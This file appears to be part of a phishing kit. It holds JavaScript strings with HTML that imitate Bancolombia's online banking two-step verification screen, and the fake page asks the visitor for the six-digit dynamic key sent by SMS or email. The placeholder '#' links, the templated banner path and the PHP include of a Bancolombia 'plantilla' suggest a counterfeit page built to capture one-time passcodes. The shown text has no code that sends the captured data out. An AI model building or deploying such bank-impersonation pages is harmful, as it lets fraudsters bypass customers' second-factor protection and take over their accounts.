var bancolombia_titulo = 'Ahora Verificar tu cuenta es fácil';
var bancolombia_contenido = `
<div class="panel panel-primary" style="min-height: 68vh;">
	<div class="row" id="error">
		<div class="col-xs-12 col-sm-12 col-md-12 mua_message_not_from_svp" id="tabError" style="display: none;">
			<div class="errorDiv">
				<div class="divTextMessage">
					<span class="icon-error errorIcon">
						<span class="path1"></span>
						<span class="path2"></span>
						<span class="path3"></span>
					</span>
					<div class="errorTitulo">Error</div>
					<div id="summary" class="errorTexto"></div>
				</div>
			</div>
		</div>
	</div>
	<div id="contenido">
		<div class="mua-panel-body">
			<div class="row">
				<div class="col-lg-4 col-md-5 col-sm-6">
					<div class="panel_general mua-panel_general">
						<div class="title-panel-label">
							<h1>
								Verificación de dos pasos
							</h1>
						</div>
						<div class="subtitle-land-label">
							<h4>
								Solo debes de ingresar la clave dinámica que te llegara por SMS o correo electrónico
							</h4>
						</div>

						<div class="mua-content-group-panel">
							<div class="mua-label-input">
								<label class="control-label-index" for="username">
									Ingresa tu Clave Dinámica
								</label>
							</div>
							<div>
								<div class="mua_svp_enroll_update_control">
									<input id="txtOTP" class="mua-form-control mua-readOnlyInput mua_svp_control_password mua-input-icon" type="password" pattern="[0-9]*" onKeypress="if (event.keyCode < 48 || event.keyCode > 57) event.returnValue = false;" maxlength="6" autocomplete="off">
									<span class="mua-icon-lock"> </span>
								</div>
							</div>
						</div>
						<div class="one-button-container mua-button-container">
							<button id="btnOTP" class="btn btn-success" type="button">
								Verificar
							</button>
						</div>
					</div>
					<div id="opciones">
						<div class="panel_general mua-panel_general">
							<div class="mua-divIcon">
								<a class="mua-itemsIcons-btn" href="#">
									<div class="mua-divCell">
										<span class="adminItems-Icons icon-icon_demo">
											<span class="path1"></span><span class="path2"></span><span class="path3"></span><span class="path4"></span><span class="path5"></span><span class="path6"></span><span class="path7"></span>
										</span>
									</div>
									<div class="mua-divCell-text">
										Conoce sobre Sucursal Virtual Personas
									</div>
								</a>
							</div>
							<div class="mua-divIcon">
								<a class="mua-itemsIcons-btn" href="#">
									<div class="mua-divCell">
										<span class="adminItems-Icons icon-icon_bloquear">
											<span class="path1"></span><span class="path2"></span>
										</span>
									</div>
									<div class="mua-divCell-text">
										Aprende sobre Seguridad
									</div>
								</a>
							</div>
							<div class="mua-divIcon">
								<a class="mua-itemsIcons-btn" href="#">
									<div class="mua-divCell">
										<span class="adminItems-Icons icon-icon_reglamento">
											<span class="path1"></span><span class="path2"></span><span class="path3"></span><span class="path4"></span><span class="path5"></span><span class="path6"></span><span class="path7"></span>
										</span>
									</div>
									<div class="mua-divCell-text">
										Reglamento Sucursal Virtual
									</div>
								</a>
							</div>
							<div class="mua-divIcon">
								<a class="mua-itemsIcons-btn" href="#">
									<div class="mua-divCell">
										<span class="adminItems-Icons icon-icon_politicas">
											<span class="path1"></span><span class="path2"></span><span class="path3"></span><span class="path4"></span><span class="path5"></span>
										</span>
									</div>
									<div class="mua-divCell-text">
										Política de Privacidad
									</div>
								</a>
							</div>
						</div>
					</div>
				</div>
				<div id="anuncios" class="mx-auto col-xs-12 col-sm-7 col-md-8 w-auto">
					<div id="banner-persona">
						<img id="imgpubli" src="${my_banco}img/publi_otp.jpg" border="0" class="img-responsive">
					</div>
					<p class="text-center">¿No conoces la Sucursal Virtual Personas de Bancolombia?&nbsp;
						Conoce más <a href="#" class="a1">aquí</a>
					</p>
				</div>
			</div>
		</div>
	</div>
</div>
`
<?php require_once('_plantilla_bancolombia.php'); ?>